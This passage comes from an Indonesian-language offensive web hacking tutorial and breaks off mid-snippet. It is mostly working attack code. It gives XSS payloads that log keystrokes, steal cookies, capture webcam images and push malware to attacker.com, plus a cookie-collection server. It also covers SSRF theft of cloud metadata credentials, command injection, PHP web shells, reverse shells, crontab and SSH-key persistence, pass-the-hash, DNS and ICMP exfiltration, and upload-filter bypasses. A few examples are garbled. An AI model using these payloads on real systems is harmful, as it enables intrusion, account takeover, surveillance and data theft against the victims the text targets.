document.onkeypress = function(e) {
    fetch('http://attacker.com/log?key=' + e.key);
};
</script>
```
- **Korban mengetik** → setiap key dikirim ke `attacker.com`.

---
#### **📌 XSS untuk Steal Cookie/Session**
**Payload:**
```html
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```
- **Korban membuka halaman** → cookies (termasuk session) dikirim ke attacker.

**Payload (Lebih Advanced):**
```html
<script>
const cookie = document.cookie;
const ip = new Promise(r => fetch('https://ipapi.co/json/').then(res => res.json()).then(data => r(data.ip)));
ip.then(ip => {
    fetch('http://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify({cookie, ip, userAgent: navigator.userAgent}),
        headers: {'Content-Type': 'application/json'}
    });
});
</script>
```
- Mengirim **cookie, IP, dan User-Agent** ke attacker.

---
#### **📌 XSS untuk Phishing**
**Payload:**
```html
<script>
const phishingPage = `
    <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999;">
        <div style="text-align: center; margin-top: 200px;">
            <h1>Please Login Again</h1>
            <form action="http://attacker.com/steal" method="POST">
                <input type="text" name="username" placeholder="Username"><br>
                <input type="password" name="password" placeholder="Password"><br>
                <button type="submit">Login</button>
            </form>
        </div>
    </div>
`;
document.body.innerHTML = phishingPage;
</script>
```
- **Korban melihat halaman login palsu** → input dikirim ke attacker.

---
#### **📌 XSS untuk Redirect**
**Payload:**
```html
<script>
window.location = 'http://attacker.com';
</script>
```
- **Korban langsung diarahkan ke website attacker**.

---
#### **📌 XSS untuk Download Malware**
**Payload:**
```html
<script>
const a = document.createElement('a');
a.href = 'http://attacker.com/malware.exe';
a.download = 'update.exe';
document.body.appendChild(a);
a.click();
</script>
```
- **Korban otomatis download malware**.

---
#### **📌 XSS untuk Webcam Capture**
**Payload:**
```html
<script>
navigator.mediaDevices.getUserMedia({video: true})
    .then(stream => {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.onloadedmetadata = () => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            const data = canvas.toDataURL('image/png');
            fetch('http://attacker.com/webcam?data=' + encodeURIComponent(data));
            stream.getTracks().forEach(track => track.stop());
        };
    });
</script>
```
- **Korban mengizinkan kamera** → foto dikirim ke attacker.

---
#### **📌 XSS untuk Keystroke Logging (Advanced)**
**Payload:**
```html
<script>
const keys = [];
document.addEventListener('keydown', e => {
    keys.push(e.key);
    if (keys.length >= 50) {
        fetch('http://attacker.com/keylogger?data=' + encodeURIComponent(keys.join('')));
        keys.length = 0;
    }
});
</script>
```
- **Merekam 50 keystroke** → dikirim ke attacker.

---
### **XSS untuk Steal Cookie/Session**
---
#### **📌 Mengapa Cookie Penting?**
- **Session Cookie** (`PHPSESSID`, `JSESSIONID`, dll) → **Akses sebagai korban tanpa password**.
- **Authentication Cookie** (`auth_token`, `remember_me`) → **Login otomatis**.
- **CSRF Token** → **Bypass CSRF protection**.

---
#### **📌 Cara Steal Cookie**
1. **Inject XSS Payload**:
   ```html
   <script>
   fetch('http://attacker.com/steal?cookie=' + document.cookie);
   </script>
   ```
2. **Korban membuka halaman** → cookies dikirim ke attacker.
3. **Attacker menggunakan cookies** untuk login sebagai korban.

**Contoh (Python - Server Attacker):**
```python
from flask import Flask, request

app = Flask(__name__)

@app.route('/steal')
def steal():
    cookie = request.args.get('cookie')
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    with open('stolen_cookies.txt', 'a') as f:
        f.write(f"IP: {ip}\nUser-Agent: {user_agent}\nCookie: {cookie}\n{'='*50}\n")

    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

---
#### **📌 Cara Gunakan Stolen Cookies**
1. **Buka browser** (Chrome/Firefox).
2. **Install extension** (EditThisCookie, Cookie-Editor).
3. **Import cookies** yang dicuri.
4. **Buka website target** → **Anda sudah login sebagai korban!**

---
### **Bypass XSS Filter**
Banyak website **memblokir tag `<script>`** atau **karakter khusus** (`<`, `>`, `"`, `'`). Berikut cara **bypass**:

---
#### **📌 Bypass dengan HTML Encoding**
| Karakter | HTML Encoding |
|----------|----------------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#39;` |
| `&` | `&amp;` |

**Contoh:**
```html
<img src=x onerror="alert('XSS')">
→
<img src=x onerror="alert(&#39;XSS&#39;)">
```

---
#### **📌 Bypass dengan JavaScript Encoding**
```html
<script>alert('XSS')</script>
→
<script>eval('\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29')</script>
```
- `\x61` = `a`, `\x6c` = `l`, dst.

---
#### **📌 Bypass dengan Event Handler**
Beberapa website **memblokir `onerror`**, tetapi **mengizinkan event handler lain**:
```html
<img src=x onmouseover=alert('XSS')>
<img src=x onload=alert('XSS')>
<img src=x onabort=alert('XSS')>
<svg onload=alert('XSS')>
<body onscroll=alert('XSS')>
```

---
#### **📌 Bypass dengan SVG**
```html
<svg>
  <script>alert('XSS')</script>
</svg>
```
- Beberapa website **mengizinkan SVG** tetapi **memblokir `<script>` di HTML**.

---
#### **📌 Bypass dengan Iframe**
```html
<iframe src="javascript:alert('XSS')"></iframe>
```
- Beberapa website **mengizinkan iframe** tetapi **memblokir `<script>`**.

---
#### **📌 Bypass dengan Location Hash**
```html
<a href="#javascript:alert('XSS')">Click Me</a>
```
- **Korban klik link** → JavaScript dieksekusi.

---
#### **📌 Bypass dengan Unicode**
```html
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074('XSS')">
```
- `\u0061` = `a`, `\u006c` = `l`, dst.

---
#### **📌 Bypass dengan DOM Clobbering**
**Konsep:** Memanfaatkan **global variable** yang ter-overwrite oleh DOM.

**Contoh:**
```html
<form id="alert">
  <input name="0" value="xss">
</form>
<script>
  alert(alert[0]);  // Output: "xss"
  alert0;        // Eksekusi: xss()
</script>
```
- Jika `alert` adalah **form ID**, maka `alert[0]` merujuk ke input, bukan fungsi `alert()`.

---
#### **📌 Bypass dengan JSFuck**
**JSFuck** adalah **JavaScript yang ditulis menggunakan hanya 6 karakter**: `[`, `]`, `(`, `)`, `!`, `+`.

**Contoh:**
```html
<script>
!![][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]])()
</script>
```
- **Output:** `alert('XSS')`

**Tools:**
- [JSFuck Decoder/Encoder](http://www.jsfuck.com/)

---
#### **📌 Bypass dengan HTML5**
```html
<details open ontoggle=alert('XSS')>
  <summary>Click Me</summary>
</details>
```
- **Korban klik** → `ontoggle` dieksekusi.

---
### **Automasi dengan XSS Hunter**
**XSS Hunter** adalah **tool otomatis** untuk mendeteksi dan mengeksploitasi XSS.

---
#### **📌 Setup XSS Hunter**
```bash
# Clone repository
git clone https://github.com/mandatoryprogrammer/XSSHunter.git
cd XSSHunter

# Install dependencies
pip install -r requirements.txt

# Jalankan
python3 xsshunter.py
```

---
#### **📌 Cara Pakai XSS Hunter**
1. **Daftar di [XSS Hunter](https://xsshunter.com/)** (untuk domain attacker).
2. **Gunakan payload**:
   ```html
   <script src="https://xsshunter.com/xss.js?c=YOUR_CODE"></script>
   ```
3. **Korban membuka halaman** → XSS Hunter **merekam request**.
4. **Lihat hasil di dashboard**.

---
---
---

## **🔹 BAB 5: SERVER-SIDE REQUEST FORGERY (SSRF) LANJUTAN**

---

### **Pengertian SSRF**
Server-Side Request Forgery (SSRF) adalah **kerentanan yang memungkinkan attacker untuk memaksa server melakukan HTTP request ke alamat internal/eksternal yang tidak seharusnya diakses**.

**Contoh Rentan (PHP):**
```php
$url = $_GET['url'];
$content = file_get_contents($url);
echo $content;
```
Jika attacker memasukkan `url=http://localhost/admin`, server akan **mengakses `http://localhost/admin`** dan mengembalikan kontennya.

---
### **Deteksi SSRF**
---
#### **📌 Manual Detection**
Coba input berikut di **parameter yang menerima URL**:
| Input | Deskripsi | Expected Behavior |
|-------|-----------|-------------------|
| `http://localhost` | Akses localhost | Error atau output internal service |
| `http://127.0.0.1` | Akses 127.0.0.1 | Sama seperti di atas |
| `http://169.254.169.254` | AWS Metadata | JSON berisi metadata AWS |
| `http://0` | Alternatif localhost | Sama seperti localhost |
| `file:///etc/passwd` | Baca file lokal | Isi `/etc/passwd` |
| `gopher://localhost:25` | SMTP request | Response SMTP |
| `dict://localhost:25` | SMTP request (alternatif) | Response SMTP |

---
#### **📌 Automated Detection (Burp Suite)**
1. **Intercept request** dengan Burp Suite.
2. **Kirim ke Repeater**.
3. **Ubah parameter URL** ke `http://localhost`.
4. **Lihat response** → jika **bukan error**, maka **vulnerable**.

---
### **Exploitasi SSRF**
---
#### **📌 SSRF untuk Internal Port Scanning**
**Tujuan:** Scan **port internal** yang tidak bisa diakses dari luar.

**Payload:**
```
http://target.com/proxy?url=http://127.0.0.1:22
http://target.com/proxy?url=http://127.0.0.1:8080
http://target.com/proxy?url=http://127.0.0.1:3306
```
- Jika **port terbuka**, response akan **berbeda** (contoh: HTTP 200, SMTP banner, dll).

**Automasi dengan Python:**
```python
import requests

target_url = "http://target.com/proxy?url="
ports = [22, 80, 443, 8080, 3306, 3389, 8000]

for port in ports:
    url = f"{target_url}http://127.0.0.1:{port}"
    try:
        r = requests.get(url, timeout=5)
        if r.status_code != 500:  # Jika bukan error
            print(f"[+] Port {port} terbuka: {r.text[:100]}")
    except:
        pass
```

---
#### **📌 SSRF untuk AWS Metadata**
**Tujuan:** Mengakses **AWS Instance Metadata** (berisi **credentials, IAM roles, dll**).

**Payload:**
```
http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/
```
**Output (jika vulnerable):**
```json
{
  "ami-id": "ami-12345678",
  "ami-launch-index": "0",
  "ami-manifest-path": "/dev/null",
  "block-device-mapping/ami": "xvda",
  "block-device-mapping/ephemeral0": "xvdb",
  "block-device-mapping/root": "/dev/xvda",
  ...
}
```

**Cari Credentials:**
```
http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
- **Output:** Daftar **IAM roles** yang bisa diakses.
- **Lanjutkan ke:**
  ```
  http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
  ```
  → **Mendapatkan AccessKey, SecretKey, Token**.

---
#### **📌 SSRF untuk File Read**
**Tujuan:** Membaca **file lokal** di server.

**Payload (file:// protocol):**
```
http://target.com/proxy?url=file:///etc/passwd
http://target.com/proxy?url=file:///etc/shadow
http://target.com/proxy?url=file:///var/www/html/config.php
```

**Payload (PHP file_get_contents):**
```php
$url = $_GET['url'];
if (strpos($url, 'file://') !== false) {
    die("Access denied");
}
$content = file_get_contents($url);
echo $content;
```
- **Bypass:** Gunakan `file:////` (4 slash) atau `php://filter/read=convert.base64-encode/resource=file:///etc/passwd`.

---
#### **📌 SSRF untuk Port Forwarding**
**Tujuan:** Memaksa server untuk **forward port** ke internal network.

**Payload (SOCKS Proxy):**
```
http://target.com/proxy?url=socks://127.0.0.1:1080
```
- Jika server **mendukung SOCKS**, attacker bisa **mengakses internal network**.

---
#### **📌 SSRF untuk Blind SSRF (DNS/HTTP Exfiltration)**
**Tujuan:** Jika **response tidak terlihat**, gunakan **DNS/HTTP exfiltration**.

**Payload (DNS Exfiltration):**
```
http://target.com/proxy?url=http://attacker.com?data=SENSITIVE_DATA
```
- **Server mengakses `attacker.com`** → **data terungkap di log attacker**.

**Payload (HTTP Exfiltration):**
```
http://target.com/proxy?url=http://attacker.com/steal?data=SENSITIVE_DATA
```
- **Attacker memonitor request** ke `/steal`.

---
### **Bypass SSRF Filter**
Banyak website **memblokir URL internal** (`localhost`, `127.0.0.1`, `169.254.169.254`). Berikut cara **bypass**:

---
#### **📌 Bypass dengan Alternatif Localhost**
| Alamat | Deskripsi |
|--------|-----------|
| `http://localhost` | Standard |
| `http://127.0.0.1` | IP localhost |
| `http://0` | Alternatif (0 = 0.0.0.0 = localhost) |
| `http://0.0.0.0` | IP localhost |
| `http://127.1` | IP parsial |
| `http://127.0.1.1` | IP alternatif |
| `http://[::1]` | IPv6 localhost |
| `http://0177.0.0.1` | Octal encoding (127.0.0.1) |
| `http://2130706433` | Decimal encoding (127.0.0.1) |
| `http://0x7f000001` | Hex encoding (127.0.0.1) |

**Contoh:**
```
http://target.com/proxy?url=http://0x7f000001:80
```

---
#### **📌 Bypass dengan URL Encoding**
| Karakter | URL Encoding |
|----------|---------------|
| `:` | `%3A` |
| `/` | `%2F` |
| `?` | `%3F` |
| `#` | `%23` |

**Contoh:**
```
http://target.com/proxy?url=http%3A%2F%2Flocalhost%3A80
```

---
#### **📌 Bypass dengan Protocol Alternatif**
| Protocol | Deskripsi |
|----------|-----------|
| `http://` | Standard HTTP |
| `https://` | HTTPS |
| `gopher://` | Gopher (bisa untuk SMTP, HTTP, dll) |
| `dict://` | Dictionary (bisa untuk SMTP) |
| `file://` | File lokal |
| `ftp://` | FTP |
| `socks://` | SOCKS proxy |

**Contoh (Gopher untuk SMTP):**
```
http://target.com/proxy?url=gopher://localhost:25
```
- **Output:** SMTP banner.

---
#### **📌 Bypass dengan Open Redirect**
**Konsep:** Jika website **memblokir URL internal**, tetapi **mengizinkan open redirect**, gunakan **redirect ke internal URL**.

**Contoh:**
1. **Temukan open redirect** di website:
   ```
   http://target.com/redirect?url=http://google.com
   ```
2. **Gunakan redirect untuk SSRF**:
   ```
   http://target.com/proxy?url=http://target.com/redirect?url=http://localhost
   ```

---
#### **📌 Bypass dengan Blind SSRF (Time-Based)**
**Konsep:** Jika **response tidak terlihat**, gunakan **time delay** untuk konfirmasi.

**Payload:**
```
http://target.com/proxy?url=http://127.0.0.1:8080
```
- Jika **port terbuka**, response **lebih cepat**.
- Jika **port tertutup**, response **lambat/error**.

**Automasi dengan Python:**
```python
import requests
import time

target_url = "http://target.com/proxy?url="
ports = [22, 80, 443, 8080, 3306]

for port in ports:
    url = f"{target_url}http://127.0.0.1:{port}"
    start = time.time()
    try:
        r = requests.get(url, timeout=5)
        elapsed = time.time() - start
        if elapsed < 2:  # Jika response cepat
            print(f"[+] Port {port} terbuka (Time: {elapsed:.2f}s)")
        else:
            print(f"[-] Port {port} tertutup (Time: {elapsed:.2f}s)")
    except:
        print(f"[-] Port {port} error")
```

---
---
---

## **🔹 BAB 6: REMOTE CODE EXECUTION (RCE) LANJUTAN**

---

### **Pengertian RCE**
Remote Code Execution (RCE) adalah **kerentanan yang memungkinkan attacker untuk mengeksekusi kode arbitrari di server**. Hal ini adalah **kerentanan paling berbahaya**, karena attacker bisa **mengambil alih server sepenuhnya**.

---
### **Deteksi RCE**
---
#### **📌 Manual Detection**
Coba input berikut di **semua parameter** (URL, form, header, dll):

| Input | Deskripsi | Expected Behavior |
|-------|-----------|-------------------|
| `; id` | Command injection (Linux) | Output: `uid=33(www-data) gid=33(www-data)` |
| `; whoami` | Command injection (Linux) | Output: `www-data` |
| `; system('id')` | PHP code injection | Output: `uid=33(www-data)` |
| `${{7*7}}` | Template injection (Jinja2) | Output: `49` |
| `{{7*7}}` | Template injection (Twig) | Output: `49` |
| `<?php system('id'); ?>` | PHP code injection | Output: `uid=33(www-data)` |

---
#### **📌 Automated Detection (Burp Suite)**
1. **Intercept request** dengan Burp Suite.
2. **Kirim ke Repeater**.
3. **Ubah parameter** ke payload RCE (contoh: `; id`).
4. **Lihat response** → jika **output command**, maka **vulnerable**.

---
### **Exploitasi RCE**
---
#### **📌 Command Injection**
**Tujuan:** Mengeksekusi **perintah shell** di server.

**Contoh Rentan (PHP):**
```php
$cmd = $_GET['cmd'];
system($cmd);
```
**Payload:**
```
http://target.com/exec.php?cmd=id
```
**Output:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Command Injection dengan Operator:**
| Operator | Deskripsi | Contoh |
|----------|-----------|--------|
| `;` | Command separator | `id; whoami` |
| `&&` | Execute jika command pertama sukses | `id && whoami` |
| `\|` | Pipe output | `ls / | grep etc` |
| `\|+` | OR (bypass filter) | `id \|\| whoami` |
| `&` | Background process | `sleep 10 &` |
| `\n` | Newline | `id\nwhoami` |
| `%0a` | URL-encoded newline | `id%0awhoami` |

**Contoh Bypass Filter:**
```
http://target.com/exec.php?cmd=id%26%26whoami
```
→ `id&&whoami`

---
#### **📌 File Upload Vulnerability**
**Tujuan:** Upload **web shell** (PHP, ASP, JSP, dll) ke server.

**Contoh Rentan:**
- Website mengizinkan **upload file** tanpa validasi.
- **Extension filter** bisa dibypass.
- **MIME type filter** bisa dibypass.

**Payload (PHP Web Shell):**
```php
<?php
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```
**Simpan sebagai:** `shell.php`

**Cara Upload:**
1. **Bypass extension filter**:
   - `shell.php` → `shell.phtml`, `shell.php5`, `shell.php.jpg`
   - Double extension: `shell.php.jpg`
   - Null byte: `shell.php%00.jpg`
2. **Bypass MIME type filter**:
   - Ganti `Content-Type: application/octet-stream` ke `Content-Type: image/jpeg`.
3. **Bypass file content filter**:
   - Encode shell dengan **Base64** dan decode di server.
   - Gunakan **PHP short tags** (`<?= system($_GET['cmd']) ?>`).

**Cara Akses:**
```
http://target.com/uploads/shell.php?cmd=id
```

---
#### **📌 Deserialization RCE**
**Tujuan:** Mengeksploitasi **deserialization** untuk eksekusi kode.

**Contoh Rentan (PHP):**
```php
$serialized = $_GET['data'];
$obj = unserialize($serialized);
```
**Payload:**
- Gunakan **PHPGGC** (PHP Generic Gadget Chain) untuk generate payload.
- Contoh:
  ```bash
  phpggc --gadget-chain PHP/8.1.0/Monolog/RCE1 --code "system('id')" > payload.txt
  ```
- **Payload:** `Tzo0OjY6"Monolog\Handler\SyslogHandler":...`
- **Eksekusi:**
  ```
  http://target.com/vuln.php?data=PAYLOAD
  ```

**Tools:**
- [PHPGGC](https://github.com/ambionics/phpggc)
- [ysoserial](https://github.com/frohoff/ysoserial) (untuk Java, .NET, dll)

---
#### **📌 Template Injection (SSTI)**
**Tujuan:** Mengeksploitasi **template engine** (Jinja2, Twig, Smarty, dll) untuk eksekusi kode.

**Contoh Rentan (Jinja2):**
```python
@app.route('/vuln')
def vuln():
    name = request.args.get('name')
    return render_template_string(f"Hello, {name}!")
```
**Payload:**
```
http://target.com/vuln?name={{7*7}}
```
**Output:**
```
Hello, 49!
```
→ **Vulnerable!**

**Exploitasi (RCE):**
```python
{{ config.items() }}  # Baca config
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}  # RCE
```

**Payload untuk Twig:**
```twig
{{_self.env.setCache("ftp://attacker.com/evil", 3600)}}
```

**Payload untuk Smarty:**
```smarty
{php}system('id');{/php}
```

---
### **Bypass RCE Filter**
---
#### **📌 Bypass dengan Encoding**
| Encoding | Contoh | Deskripsi |
|----------|--------|-----------|
| **URL Encoding** | `%3B` | `;` |
| **Double URL Encoding** | `%253B` | `%3B` |
| **Hex Encoding** | `0x3B` | `;` |
| **Base64 Encoding** | `base64_decode('aWQ=')` | `id` |

**Contoh:**
```
http://target.com/exec.php?cmd=%3B%20id
```
→ `; id`

---
#### **📌 Bypass dengan Command Substitution**
```bash
# Linux
`id`
$(id)

# Windows
%0|%0id
```

**Contoh:**
```
http://target.com/exec.php?cmd=$(id)
```

---
#### **📌 Bypass dengan Wildcard**
```bash
# Linux
/i*d
/w*oami

# Windows
i?d
w?oami
```

**Contoh:**
```
http://target.com/exec.php?cmd=/i*d
```

---
#### **📌 Bypass dengan Environment Variables**
```bash
# Linux
${PATH}
$PATH

# Windows
%PATH%
```

**Contoh:**
```
http://target.com/exec.php?cmd=${PATH}
```

---
#### **📌 Bypass dengan Here Document**
```bash
# Linux
<<EOF
id
EOF
```

**Contoh:**
```
http://target.com/exec.php?cmd=<<EOF\nid\nEOF
```

---
#### **📌 Bypass dengan PHP Tags**
| Tag | Deskripsi |
|-----|-----------|
| `<?php ... ?>` | Standard PHP tag |
| `<? ... ?>` | Short PHP tag |
| `<% ... %>` | ASP-style tag |
| `<script language="php"> ... </script>` | Script tag |

**Contoh:**
```
http://target.com/vuln.php?code=<?php system('id'); ?>
http://target.com/vuln.php?code=<? system('id'); ?>
```

---
#### **📌 Bypass dengan PHP Functions**
| Function | Deskripsi | Contoh |
|----------|-----------|--------|
| `system()` | Eksekusi command | `system('id')` |
| `exec()` | Eksekusi command | `exec('id')` |
| `shell_exec()` | Eksekusi command | `shell_exec('id')` |
| `passthru()` | Eksekusi command + output | `passthru('id')` |
| `popen()` | Eksekusi command + handle | `popen('id', 'r')` |
| `eval()` | Eksekusi PHP code | `eval('system("id");')` |
| `assert()` | Eksekusi PHP code (jika enabled) | `assert('system("id")')` |
| `create_function()` | Buat fungsi dari string | `create_function('', 'system("id");')()` |

**Contoh Bypass `system()`:**
```
http://target.com/vuln.php?code=pre_g('id')
```
- Jika `pre_g` = `system`, maka `system('id')` dieksekusi.

---
#### **📌 Bypass dengan PHP Wrappers**
| Wrapper | Deskripsi | Contoh |
|---------|-----------|--------|
| `php://filter` | Filter data | `php://filter/read=convert.base64-encode/resource=file:///etc/passwd` |
| `php://input` | Baca POST data | `php://input` |
| `php://fd` | File descriptor | `php://fd/3` |
| `data://` | Data URL | `data://text/plain,<?php system('id'); ?>` |
| `expect://` | Process substitution | `expect://id` |

**Contoh (Read File):**
```
http://target.com/vuln.php?file=php://filter/read=convert.base64-encode/resource=file:///etc/passwd
```
→ **Output:** Base64-encoded `/etc/passwd`.

---
### **Post-Exploitation RCE**
Setelah berhasil **RCE**, langkah selanjutnya adalah **post-exploitation**:

---
#### **📌 Maintain Access (Persistence)**
1. **Cron Job**:
   ```bash
   echo "* * * * * root /tmp/backdoor.sh" >> /etc/crontab
   ```
2. **SSH Key**:
   ```bash
   echo "ssh-rsa AAAAB3NzaC1yc2E... attacker@machine" >> ~/.ssh/authorized_keys
   ```
3. **Web Shell**:
   - Upload **PHP/ASP/JSP shell** ke direktori web.
4. **Reverse Shell**:
   ```bash
   bash -i >& /dev/tcp/attacker.com/4444 0>&1
   ```
   Atau:
   ```bash
   python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
   ```

---
#### **📌 Privilege Escalation**
1. **Cek user saat ini**:
   ```bash
   whoami
   id
   ```
2. **Cek SUID binaries**:
   ```bash
   find / -perm -4000 -type f 2>/dev/null
   ```
3. **Cek sudo permissions**:
   ```bash
   sudo -l
   ```
4. **Cek kernel version**:
   ```bash
   uname -a
   ```
5. **Search exploit**:
   ```bash
   searchsploit linux kernel 5.4
   ```
6. **Run exploit**:
   ```bash
   gcc exploit.c -o exploit
   ./exploit
   ```

**Tools:**
- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) (Linux)
- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) (Windows)

---
#### **📌 Lateral Movement**
1. **Scan internal network**:
   ```bash
   nmap -sV 192.168.1.0/24
   ```
2. **Brute force SSH**:
   ```bash
   hydra -L users.txt -P passwords.txt ssh://192.168.1.100
   ```
3. **Pass-the-Hash**:
   ```bash
   python3 psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 admin@192.168.1.100
   ```
4. **SMB Execution**:
   ```bash
   crackmapexec smb 192.168.1.0/24 -u admin -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -X "whoami"
   ```

---
#### **📌 Data Exfiltration**
1. **Download file**:
   ```bash
   wget http://attacker.com/shell.php -O /var/www/html/shell.php
   curl http://attacker.com/shell.php -o /var/www/html/shell.php
   ```
2. **Upload file ke attacker**:
   ```bash
   curl -F "file=@/etc/passwd" http://attacker.com/upload
   ```
3. **Encode data (Base64)**:
   ```bash
   cat /etc/passwd | base64
   ```
4. **Exfiltrasi via DNS**:
   ```bash
   nslookup $(cat /etc/passwd | base64).attacker.com
   ```
5. **Exfiltrasi via ICMP**:
   ```bash
   ping -c 1 -p $(cat /etc/passwd | base64) attacker.com
   ```

---
---
---

## **🔹 BAB 7: FILE UPLOAD VULNERABILITIES**

---

### **Pengertian File Upload Vulnerability**
File Upload Vulnerability adalah **kerentanan yang memungkinkan attacker untuk meng-upload file berbahaya (malware, web shell, dll) ke server**. Hal ini terjadi karena **validasi file yang tidak memadai**.

---
### **Deteksi File Upload Vulnerability**
---
#### **📌 Manual Detection**
1. **Coba upload file** dengan extension:
   - `.php`, `.php5`, `.phtml`, `.asp`, `.aspx`, `.jsp`, `.js`, `.html`
   - `.svg`, `.htaccess`
2. **Coba bypass extension filter**:
   - Double extension: `shell.php.jpg`
   - Null byte: `shell.php%00.jpg`
   - Case variation: `shell.PHP`
3. **Coba bypass MIME type filter**:
   - Ganti `Content-Type: application/octet-stream` ke `Content-Type: image/jpeg`.
4. **Coba bypass file content filter**:
   - Upload file dengan **PHP code di dalam gambar** (steganography).
   - Encode shell dengan **Base64** dan decode di server.

---
#### **📌 Automated Detection (Burp Suite)**
1. **Intercept upload request** dengan Burp Suite.
2. **Ubah extension/file content** ke payload berbahaya.
3. **Forward request** → jika file **berhasil di-upload**, maka **vulnerable**.

---
### **Exploitasi File Upload**
---
#### **📌 Bypass File Extension Filter**
| Teknik | Contoh | Deskripsi |
|--------|--------|-----------|
| **Double Extension** | `shell.php.jpg` | Server hanya cek extension terakhir |
| **Null Byte** | `shell.php%00.jpg` | Null byte (`%00`) menghentikan parsing |
| **Case Variation** | `shell.PHP` | Beberapa server case-sensitive |
| **Alternatif Extension** | `shell.phtml`, `shell.php5` | Extension alternatif yang dieksekusi |
| **No Extension** | `shell` | Beberapa server eksekusi file tanpa extension |
| **Path Traversal** | `shell.php/../../var/www/html/shell.php` | Upload ke lokasi yang diinginkan |
| **HTAccess Override** | `.htaccess` dengan `AddType application/x-httpd-php .jpg` | Ubah MIME type `.jpg` ke PHP |

**Contoh Bypass:**
1. **Upload `shell.jpg`** dengan content:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
2. **Upload `.htaccess`** dengan content:
   ```
   AddType application/x-httpd-php .jpg
   ```
3. **Akses shell:**
   ```
   http://target.com/uploads/shell.jpg?cmd=id
   ```

---
#### **📌 Bypass MIME Type Filter**
**Konsep:** Server memeriksa **`Content-Type` header** untuk menentukan tipe file.

**Bypass:**
- Ganti `Content-Type: application/octet-stream` ke `Content-Type: image/jpeg`.
- Gunakan **Burp Suite** untuk modify header.

**Contoh Request:**
```http
POST /upload.php HTTP/1.1
Host: target.com
Content-Type: image/jpeg
Content-Length: 123

<?php system($_GET['cmd']); ?>
```

---
#### **📌 Bypass File Size Limit**
**Konsep:** Server membatasi **ukuran file** yang bisa di-upload.

**Bypass:**
1. **Compress file** (ZIP, GZIP).
2. **Split file** menjadi bagian kecil.
3. **Upload via chunks** (JavaScript).
4. **Bypass di client-side** (modify JavaScript validation).

**Contoh (PHP):**
```php
// Bypass client-side validation
<input type="file" name="file" onchange="this.files[0].size=1000">
```

---
#### **📌 Bypass File Content Filter**
**Konsep:** Server memeriksa **isi file** untuk mendeteksi malware/web shell.

**Bypass:**
1. **Encode file** (Base64, ROT13, XOR).
2. **Obfuscate code** (ganti variabel, tambah komentar).
3. **Split code** (bagi ke beberapa file yang digabungkan nanti).
4. **Use image polyglot** (file gambar + PHP code).

**Contoh (Base64 Encoded Shell):**
```php
<?php
$shell = base64_decode("PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID4+");
eval($shell);
?>
```
- **Upload sebagai `shell.php`** → server tidak mendeteksi `system($_GET['cmd'])`.

---
#### **📌 Web Shell Upload**
**Web Shell** adalah **script yang memungkinkan attacker untuk mengeksekusi perintah di server** via HTTP.

---
##### **🔹 PHP Web Shell**
**File: `shell.php`**
```php
<?php
if (isset($_GET['cmd'])) {
